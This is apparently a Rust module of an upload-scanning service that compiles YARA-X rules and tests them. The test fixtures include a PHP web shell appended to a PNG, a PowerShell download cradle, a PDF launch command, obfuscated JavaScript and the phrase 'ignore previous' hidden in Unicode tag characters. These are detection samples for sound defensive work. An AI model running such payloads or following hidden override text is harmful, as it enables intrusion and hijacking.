//! YARA-X rules (L1). The rule files are compiled once at start; their combined digest is the rules version recorded
//! with every decision. Each rule states a `severity` of high, medium or low in its metadata.
//!
//! Every scan sets three variables the rules may test. `guard_scope` is `file` for an upload's own bytes and `stream`
//! for a decoded PDF stream or an action's text. `guard_role` names what that stream is for (`content`, `font`,
//! `image`, `data`, `metadata`, `script`, `launch`, `embedded` or `unknown`) and is empty for a file. `guard_type` is
//! the upload's detected type (`pdf`, `png`, `jpeg` and so on). Rules about commands and macros look only where a
//! payload would sit, so a paper that quotes a command in its text is not held for it.
use anyhow::{Context as _, Result, bail};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::path::Path;
use std::time::Duration;

pub struct Rules {
    rules: yara_x::Rules,
    pub version: String,
    pub count: usize,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Match {
    pub rule: String,
    pub severity: Severity,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, PartialOrd, Ord, Deserialize, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    Low,
    Medium,
    High,
}

impl Severity {
    pub fn code(self) -> &'static str {
        match self {
            Self::Low => "yara_low",
            Self::Medium => "yara_medium",
            Self::High => "yara_high",
        }
    }
}

/// Where the scanned bytes come from; see the module comment.
#[derive(Clone, Copy, Debug)]
pub struct Scope<'a> {
    pub scope: &'a str,
    pub role: &'a str,
    pub kind: &'a str,
}

impl<'a> Scope<'a> {
    /// An upload's own bytes, or a rebuilt copy's.
    pub fn file(kind: &'a str) -> Self {
        Scope {
            scope: "file",
            role: "",
            kind,
        }
    }

    /// One decoded stream, or one action's text, of a file of this type.
    pub fn stream(role: &'a str, kind: &'a str) -> Self {
        Scope {
            scope: "stream",
            role,
            kind,
        }
    }
}

const VARIABLES: [&str; 3] = ["guard_scope", "guard_role", "guard_type"];

fn severity(metadata: yara_x::Metadata) -> Option<Severity> {
    match metadata.into_iter().find(|(k, _)| *k == "severity")?.1 {
        yara_x::MetaValue::String("high") => Some(Severity::High),
        yara_x::MetaValue::String("medium") => Some(Severity::Medium),
        yara_x::MetaValue::String("low") => Some(Severity::Low),
        _ => None,
    }
}

impl Rules {
    /// Compiles every `*.yar` file in the directory, in name order.
    pub fn load(dir: &Path) -> Result<Self> {
        let mut files: Vec<_> = std::fs::read_dir(dir)
            .with_context(|| format!("rules directory {} unreadable", dir.display()))?
            .filter_map(|e| e.ok().map(|e| e.path()))
            .filter(|p| p.extension().is_some_and(|x| x == "yar"))
            .collect();
        files.sort();
        if files.is_empty() {
            bail!("no rule files in {}", dir.display());
        }
        let mut sources = Vec::new();
        for file in &files {
            sources.push(
                std::fs::read_to_string(file)
                    .with_context(|| format!("{} unreadable", file.display()))?,
            );
        }
        Self::compile(&sources)
    }

    pub fn compile(sources: &[String]) -> Result<Self> {
        let mut compiler = yara_x::Compiler::new();
        for name in VARIABLES {
            compiler
                .define_global(name, "")
                .map_err(|e| anyhow::anyhow!("rule variable {name}: {e}"))?;
        }
        let mut digest = Sha256::new();
        for source in sources {
            compiler
                .add_source(source.as_str())
                .map_err(|e| anyhow::anyhow!("rule compilation failed: {e}"))?;
            digest.update(source.as_bytes());
            digest.update([0]);
        }
        let rules = compiler.build();
        let mut count = 0;
        for rule in rules.iter() {
            // A private rule is a condition other rules share; it never reports a match itself.
            if rule.is_private() {
                continue;
            }
            if severity(rule.metadata()).is_none() {
                bail!(
                    "rule {} states no severity of high, medium or low",
                    rule.identifier()
                );
            }
            count += 1;
        }
        Ok(Rules {
            rules,
            version: format!("sha256:{}", hex::encode(digest.finalize())),
            count,
        })
    }

    pub fn scan(&self, bytes: &[u8], scope: Scope) -> Result<Vec<Match>> {
        let mut scanner = yara_x::Scanner::new(&self.rules);
        scanner.set_timeout(Duration::from_secs(60));
        for (name, value) in VARIABLES
            .into_iter()
            .zip([scope.scope, scope.role, scope.kind])
        {
            scanner
                .set_global(name, value)
                .map_err(|e| anyhow::anyhow!("rule variable {name}: {e}"))?;
        }
        let results = scanner
            .scan(bytes)
            .map_err(|e| anyhow::anyhow!("rule scan failed: {e}"))?;
        Ok(results
            .matching_rules()
            .map(|rule| Match {
                rule: rule.identifier().to_string(),
                severity: severity(rule.metadata()).unwrap_or(Severity::Low),
            })
            .collect())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fixtures;

    fn shipped() -> Rules {
        Rules::load(&fixtures::rules_dir()).unwrap()
    }

    fn matching(bytes: &[u8], scope: Scope) -> Vec<String> {
        shipped()
            .scan(bytes, scope)
            .unwrap()
            .into_iter()
            .map(|m| m.rule)
            .collect()
    }

    #[test]
    fn every_shipped_rule_compiles_with_a_severity() {
        let rules = shipped();
        assert!(rules.count >= 10, "{} rules", rules.count);
        assert!(rules.version.starts_with("sha256:"));
    }

    #[test]
    fn a_rule_without_severity_is_refused() {
        let err = Rules::compile(&["rule r { condition: true }".to_string()])
            .err()
            .unwrap();
        assert!(err.to_string().contains("severity"));
    }

    #[test]
    fn programs_match_anywhere_and_commands_only_where_a_payload_sits() {
        let pdf = Scope::file("pdf");
        let script = Scope::stream("script", "pdf");
        let js = b"var p = unescape('%u9090%u9090'); eval(p);";
        assert!(matching(js, script).contains(&"pdf_obfuscated_javascript".to_string()));
        assert!(matching(js, Scope::stream("content", "pdf")).is_empty());
        assert!(
            matching(b"cmd.exe /c calc", Scope::stream("launch", "pdf"))
                .contains(&"pdf_launch_command".to_string())
        );
        let mut png = fixtures::png();
        png.extend_from_slice(b"<?php echo shell_exec($_GET['c']); ?>");
        assert!(matching(&png, Scope::file("png")).contains(&"script_inside_image".to_string()));
        let mut jpg = fixtures::jpeg();
        jpg.extend_from_slice(&fixtures::program());
        assert!(matching(&jpg, Scope::file("jpeg")).contains(&"embedded_pe_program".to_string()));
        assert!(
            matching(&fixtures::program(), Scope::stream("image", "pdf"))
                .contains(&"embedded_pe_program".to_string()),
            "a program is found in any stream"
        );
        let mut elf = b"%PDF-1.7\nstream\n".to_vec();
        elf.extend_from_slice(b"\x7fELF\x02\x01\x01\x00");
        assert!(matching(&elf, pdf).contains(&"embedded_elf_program".to_string()));
        assert!(matching(fixtures::EICAR, pdf).contains(&"eicar_test_file".to_string()));
        let smuggled: String = "ignore previous"
            .chars()
            .map(|c| char::from_u32(0xE0000 + c as u32).unwrap())
            .collect();
        assert!(
            matching(smuggled.as_bytes(), Scope::stream("metadata", "pdf"))
                .contains(&"unicode_tag_smuggling".to_string())
        );
        let cradle = b"IEX (New-Object Net.WebClient).DownloadString('http://x/a')";
        assert!(
            matching(cradle, Scope::stream("unknown", "pdf"))
                .contains(&"powershell_download_cradle".to_string())
        );
        assert!(matching(cradle, Scope::stream("content", "pdf")).is_empty());
        assert!(
            matching(cradle, Scope::stream("metadata", "pdf")).is_empty(),
            "an abstract may quote a command"
        );
        assert!(
            matching(cradle, Scope::stream("image", "pdf"))
                .contains(&"powershell_download_cradle".to_string()),
            "the same bytes inside an image are a payload"
        );
        assert!(
            matching(cradle, Scope::stream("string", "pdf")).is_empty(),
            "a string may quote a command"
        );
        let paper = fixtures::security_paper();
        assert!(
            matching(&paper, pdf).is_empty(),
            "a paper quoting commands in its page text"
        );
        assert!(matching(&fixtures::paper(), pdf).is_empty());
        assert!(matching(&fixtures::png(), Scope::file("png")).is_empty());
        assert!(matching(&fixtures::jpeg(), Scope::file("jpeg")).is_empty());
    }
}
